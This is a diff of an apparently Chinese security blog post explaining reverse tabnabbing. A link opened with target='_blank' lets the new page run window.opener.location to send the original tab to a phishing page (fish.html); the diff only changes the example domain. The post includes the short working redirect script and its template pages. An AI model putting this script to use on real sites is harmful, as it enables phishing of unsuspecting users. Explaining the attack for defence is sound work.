@@ -105,16 +105,16 @@
 
 <h3 id="0x00-blank">0x00 _blank</h3>
 
-<p>_blank是html中的标签属性，如<code>&lt;a target=&quot;_blank&quot; href=&quot;http://xss.reber-9.com/1.php&quot;&gt;HELLO&lt;/a&gt;</code>, 但若点击HELLO打开的网页1.php中有如下代码：</p>
+<p>_blank是html中的标签属性，如<code>&lt;a target=&quot;_blank&quot; href=&quot;http://xss.reber.com/1.php&quot;&gt;HELLO&lt;/a&gt;</code>, 但若点击HELLO打开的网页1.php中有如下代码：</p>
 
 <pre><code>&lt;script&gt;
 if(window.opener){
-  window.opener.location  = &quot;http://xss.reber-9.com/fish.html&quot;;
+  window.opener.location  = &quot;http://xss.reber.com/fish.html&quot;;
 }
 &lt;/script&gt;
 </code></pre>
 
-<p>则原网页将转跳到<a href="http://xss.reber-9.com/fish.html">http://xss.reber-9.com/fish.html</a> ，这就会造成钓鱼</p>
+<p>则原网页将转跳到<a href="http://xss.reber.com/fish.html">http://xss.reber.com/fish.html</a> ，这就会造成钓鱼</p>
 
 <h3 id="0x01-简单模板">0x01 简单模板</h3>
 
@@ -129,13 +129,13 @@ if(window.opener){
     &lt;title&gt;Document&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
-    &lt;a target=&quot;_blank&quot; href=&quot;http://xss.reber-9.com/1.php&quot;&gt;HELLO&lt;/a&gt;
+    &lt;a target=&quot;_blank&quot; href=&quot;http://xss.reber.com/1.php&quot;&gt;HELLO&lt;/a&gt;
 &lt;/body&gt;
 &lt;/html&gt;
 </code></pre>
 
 <ul>
-<li><code>http://xss.reber-9.com/1.php</code>中1.php内容如下：</li>
+<li><code>http://xss.reber.com/1.php</code>中1.php内容如下：</li>
 </ul>
 
 <pre><code>&lt;html&gt;
@@ -143,7 +143,7 @@ if(window.opener){
     &lt;title&gt;test&lt;/title&gt;
     &lt;script&gt;
         if(window.opener){
-            window.opener.location = &quot;http://xss.reber-9.com/fish.html&quot;;
+            window.opener.location = &quot;http://xss.reber.com/fish.html&quot;;
         }
     &lt;/script&gt;
 &lt;/head&gt;
